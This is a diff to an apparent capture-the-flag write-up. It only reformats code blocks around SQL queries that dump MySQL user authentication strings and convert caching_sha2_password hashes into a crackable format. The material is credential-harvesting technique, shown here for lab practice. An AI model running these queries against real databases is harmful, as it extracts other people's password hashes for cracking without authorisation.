@@ -301,6 +301,9 @@ $ mysql -u clocky_user -p
 I searched for hashes to crack in `mysql` database, in table `user`
 ```sql
 mysql> SELECT `Host`, `User`, `Authentication_string`, `plugin`  FROM `user`;
+```
+
+```
 +-----------+------------------+------------------------------------------------------------------------+-----------------------+
 | Host      | User             | Authentication_string                                                  | plugin                |
 +-----------+------------------+------------------------------------------------------------------------+-----------------------+
@@ -321,6 +324,9 @@ Sadly, none of these strings worked as hashes. But with [this article](https://w
 
 ```sql
 mysql> SELECT `User`, CONCAT('$mysql',LEFT(authentication_string,6),'*',INSERT(HEX(SUBSTR(authentication_string,8)),41,0,'*')) AS hash FROM mysql.user WHERE plugin = 'caching_sha2_password' AND authentication_string NOT LIKE '%INVALIDSALTANDPASSWORD%' AND authentication_string !='';
+```
+
+```
 +------------------+----------------------------------------------------------------------------------------------------------------------------------------------+
 | User             | hash                                                                                                                                         |
 +------------------+----------------------------------------------------------------------------------------------------------------------------------------------+
